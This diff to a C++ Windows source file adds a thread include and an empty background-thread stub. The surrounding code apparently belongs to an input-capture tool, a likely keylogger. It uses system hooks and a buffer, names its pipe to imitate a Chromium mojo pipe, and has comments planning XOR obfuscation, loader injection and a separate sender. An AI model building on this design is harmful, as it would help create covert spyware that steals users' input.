@@ -3,6 +3,7 @@
 #include <windows.h>
 #include <signal.h>
 #include <vector>
+#include <thread>
 
 
 std::vector<char> buf;
@@ -10,7 +11,13 @@ HWINEVENTHOOK WindowHook;
 HHOOK Hook;
 constexpr std::string_view PipeName = "LOCAL\mojo.30978.30336.13392945920937653385"; // xor this later, maybe inject from loader
 
+std::jthread BackgroundThread;
+
 //todo jthread to dump the buf into the pipe, add the loader / sender projects to this git repo 
+
+void StartBufferDump() {
+    BackgroundThread = std::jthread();
+}
 
 void CleanUp() {
     MessageBoxA(NULL, "Test", "Test Title", 0);
